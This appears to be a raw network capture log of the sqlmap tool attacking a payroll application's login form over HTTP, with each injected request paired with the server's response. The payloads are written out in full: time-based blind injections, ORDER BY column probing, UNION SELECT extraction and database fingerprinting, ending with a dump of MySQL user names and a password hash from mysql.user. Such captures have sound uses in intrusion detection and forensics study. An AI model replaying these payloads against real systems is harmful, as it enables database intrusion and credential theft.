530	192.168.1.3	37922	192.168.2.2	80	user=EaKp%3BSELECT%20PG_SLEEP%285%29--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
535	192.168.2.2	80	192.168.1.3	37922	\n\n<center><h2>Welcome, EaKp;SELECT PG_SLEEP(5)--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
541	192.168.1.3	37924	192.168.2.2	80	user=EaKp%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
547	192.168.2.2	80	192.168.1.3	37924	\n\n		
553	192.168.1.3	37926	192.168.2.2	80	user=EaKp%27%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
556	192.168.2.2	80	192.168.1.3	37926	\n\n<center><h2>Welcome, EaKp';WAITFOR DELAY '0:0:5'--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr>		
565	192.168.1.3	37928	192.168.2.2	80	user=EaKp%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
568	192.168.2.2	80	192.168.1.3	37928	\n\n		
577	192.168.1.3	37930	192.168.2.2	80	user=EaKp%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
580	192.168.2.2	80	192.168.1.3	37930	\n\n		
589	192.168.1.3	37932	192.168.2.2	80	user=EaKp%27%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2872%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
592	192.168.2.2	80	192.168.1.3	37932	\n\n		
604	192.168.1.3	37934	192.168.2.2	80	user=EaKp%27%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2872%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
607	192.168.2.2	80	192.168.1.3	37934	\n\n<center><h2>Welcome, EaKp';SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(72)||CHR(113)||CHR(103),5) FROM DUAL--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr>		
613	192.168.1.3	37938	192.168.2.2	80	user=EaKp%29%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2872%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
619	192.168.2.2	80	192.168.1.3	37938	\n\n<center><h2>Welcome, EaKp);SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(72)||CHR(113)||CHR(103),5) FROM DUAL--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
625	192.168.1.3	37940	192.168.2.2	80	user=EaKp%3BSELECT%20DBMS_PIPE.RECEIVE_MESSAGE%28CHR%2887%29%7C%7CCHR%2872%29%7C%7CCHR%28113%29%7C%7CCHR%28103%29%2C5%29%20FROM%20DUAL--&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
628	192.168.2.2	80	192.168.1.3	37940	\n\n<center><h2>Welcome, EaKp;SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(87)||CHR(72)||CHR(113)||CHR(103),5) FROM DUAL--</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
637	192.168.1.3	37942	192.168.2.2	80	user=EaKp%27%29%20AND%20%28SELECT%201205%20FROM%20%28SELECT%28SLEEP%285%29%29%29VhkW%29%20AND%20%28%27AECz%27%3D%27AECz&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
640	192.168.2.2	80	192.168.1.3	37942	\n\n		
649	192.168.1.3	37944	192.168.2.2	80	user=EaKp%27%20AND%20%28SELECT%201205%20FROM%20%28SELECT%28SLEEP%285%29%29%29VhkW%29%20AND%20%27Cmqc%27%3D%27Cmqc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
657	192.168.2.2	80	192.168.1.3	37944	\n\n<center><h2>Welcome, EaKp' AND (SELECT 1205 FROM (SELECT(SLEEP(5)))VhkW) AND 'Cmqc'='Cmqc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
663	192.168.1.3	37948	192.168.2.2	80	user=EaKp%27%20AND%20%28SELECT%201205%20FROM%20%28SELECT%28SLEEP%280%29%29%29VhkW%29%20AND%20%27Cmqc%27%3D%27Cmqc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
669	192.168.2.2	80	192.168.1.3	37948	\n\n<center><h2>Welcome, EaKp' AND (SELECT 1205 FROM (SELECT(SLEEP(0)))VhkW) AND 'Cmqc'='Cmqc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
675	192.168.1.3	37950	192.168.2.2	80	user=EaKp%27%20AND%20%28SELECT%201205%20FROM%20%28SELECT%28SLEEP%285%29%29%29VhkW%29%20AND%20%27Cmqc%27%3D%27Cmqc&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
681	192.168.2.2	80	192.168.1.3	37950	\n\n<center><h2>Welcome, EaKp' AND (SELECT 1205 FROM (SELECT(SLEEP(5)))VhkW) AND 'Cmqc'='Cmqc</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
687	192.168.1.3	37952	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%201--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
690	192.168.2.2	80	192.168.1.3	37952	\n\n<center><h2>Welcome, EaKp' ORDER BY 1-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
699	192.168.1.3	37954	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%201536--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
705	192.168.2.2	80	192.168.1.3	37954	\n\n		
711	192.168.1.3	37956	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%2010--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
714	192.168.2.2	80	192.168.1.3	37956	\n\n		
726	192.168.1.3	37960	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%206--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
729	192.168.2.2	80	192.168.1.3	37960	\n\n		
735	192.168.1.3	37958	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%204--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
739	192.168.2.2	80	192.168.1.3	37958	\n\n<center><h2>Welcome, EaKp' ORDER BY 4-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr></table></center>		
750	192.168.1.3	37964	192.168.2.2	80	user=EaKp%27%20ORDER%20BY%205--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
753	192.168.2.2	80	192.168.1.3	37964	\n\n		
759	192.168.1.3	37962	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
762	192.168.2.2	80	192.168.1.3	37962	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f,0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n</table></center>		
771	192.168.1.3	37966	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f%2C0x7162787871%29%2CNULL%2CNULL%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C0x6268546770576e7a7a694c54566c6b56574e63644c44646d786e444648464b4c536f684762494b74%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
774	192.168.2.2	80	192.168.1.3	37966	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f,0x7162787871),NULL,NULL UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x6268546770576e7a7a694c54566c6b56574e63644c44646d786e444648464b4c536f684762494b74,0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqbhTgpWnzziLTVlkVWNcdLDdmxnDFHFKLSohGbIKtqbxxq</td><td></td><td></td></tr>\n</table></center>		
786	192.168.1.3	37970	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f%2C0x7162787871%29%2CNULL%2CNULL%20FROM%20%28SELECT%200%20AS%20MidM%20UNION%20SELECT%201%20UNION%20SELECT%202%20UNION%20SELECT%203%20UNION%20SELECT%204%20UNION%20SELECT%205%20UNION%20SELECT%206%20UNION%20SELECT%207%20UNION%20SELECT%208%20UNION%20SELECT%209%20UNION%20SELECT%2010%20UNION%20SELECT%2011%20UNION%20SELECT%2012%20UNION%20SELECT%2013%20UNION%20SELECT%2014%29%20AS%20IGeF--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
789	192.168.2.2	80	192.168.1.3	37970	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,0x7a7275536d4f52424b73766a5561705a74714e78756a496b6254467265476877655768784472554f,0x7162787871),NULL,NULL FROM (SELECT 0 AS MidM UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS IGeF-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqzruSmORBKsvjUapZtqNxujIkbTFreGhweWhxDrUOqbxxq</td><td></td><td></td></tr>\n</table></center>		
795	192.168.1.3	37968	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28VERSION%28%29%20LIKE%200x254d61726961444225%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
801	192.168.2.2	80	192.168.1.3	37968	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkq0qbxxq</td><td></td><td></td></tr>\n</table></center>		
807	192.168.1.3	37972	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28VERSION%28%29%20LIKE%200x255469444225%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
810	192.168.2.2	80	192.168.1.3	37972	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkq0qbxxq</td><td></td><td></td></tr>\n</table></center>		
822	192.168.1.3	37976	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28%40%40VERSION_COMMENT%20LIKE%200x256472697a7a6c6525%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
825	192.168.2.2	80	192.168.1.3	37976	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkq0qbxxq</td><td></td><td></td></tr>\n</table></center>		
832	192.168.1.3	37974	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28%40%40VERSION_COMMENT%20LIKE%200x25506572636f6e6125%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
837	192.168.2.2	80	192.168.1.3	37974	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x7162787871),NULL,NULL-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkq0qbxxq</td><td></td><td></td></tr>\n</table></center>		
843	192.168.1.3	37978	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28AURORA_VERSION%28%29%20LIKE%200x25%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
849	192.168.2.2	80	192.168.1.3	37978	\n\n		
855	192.168.1.3	37980	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2C%28CASE%20WHEN%20%28AURORA_VERSION%28%29%20LIKE%200x25%29%20THEN%201%20ELSE%200%20END%29%2C0x7162787871%29%2CNULL%2CNULL--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
858	192.168.2.2	80	192.168.1.3	37980	\n\n		
870	192.168.1.3	37984	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2CJSON_ARRAYAGG%28CONCAT_WS%280x6e6167786371%2Cuser%2Cauthentication_string%29%29%2C0x7162787871%29%2CNULL%2CNULL%20FROM%20mysql.user--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
873	192.168.2.2	80	192.168.1.3	37984	\n\n		
879	192.168.1.3	37982	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2CIFNULL%28CAST%28user%20AS%20CHAR%29%2C0x20%29%2C0x6e6167786371%2CIFNULL%28CAST%28authentication_string%20AS%20CHAR%29%2C0x20%29%2C0x7162787871%29%2CNULL%2CNULL%20FROM%20mysql.user--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
885	192.168.2.2	80	192.168.1.3	37982	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,IFNULL(CAST(user AS CHAR),0x20),0x6e6167786371,IFNULL(CAST(authentication_string AS CHAR),0x20),0x7162787871),NULL,NULL FROM mysql.user-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkqrootnagxcqqbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqrootnagxcqqbxxq</td><td></td><td></td></tr>\n</table></center>		
891	192.168.1.3	37986	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2CJSON_ARRAYAGG%28CONCAT_WS%280x6e6167786371%2Cuser%2Cpassword%29%29%2C0x7162787871%29%2CNULL%2CNULL%20FROM%20mysql.user--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
894	192.168.2.2	80	192.168.1.3	37986	\n\n		
904	192.168.1.3	37988	192.168.2.2	80	user=EaKp%27%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x716a626b71%2CIFNULL%28CAST%28user%20AS%20CHAR%29%2C0x20%29%2C0x6e6167786371%2CIFNULL%28CAST%28password%20AS%20CHAR%29%2C0x20%29%2C0x7162787871%29%2CNULL%2CNULL%20FROM%20mysql.user--%20-&password=&s=OK	sqlmap/1.6#stable (https://sqlmap.org)	http://192.168.2.2/payroll_app.php
909	192.168.2.2	80	192.168.1.3	37988	\n\n<center><h2>Welcome, EaKp' UNION ALL SELECT NULL,CONCAT(0x716a626b71,IFNULL(CAST(user AS CHAR),0x20),0x6e6167786371,IFNULL(CAST(password AS CHAR),0x20),0x7162787871),NULL,NULL FROM mysql.user-- -</h2><br><table style='border-radius: 25px; border: 2px solid black;' cellspacing=30><tr><th>Username</th><th>First Name</th><th>Last Name</th><th>Salary</th></tr><tr><td></td><td>qjbkqrootnagxcq*67A5195F64E08F5700B665061545D5473D77B5D7qbxxq</td><td></td><td></td></tr>\n<tr><td></td><td>qjbkqrootnagxcq*67A5195F64E08F5700B665061545D5473D77B5D7qbxxq</td><td></td><td></td></tr>\n</table></center>		
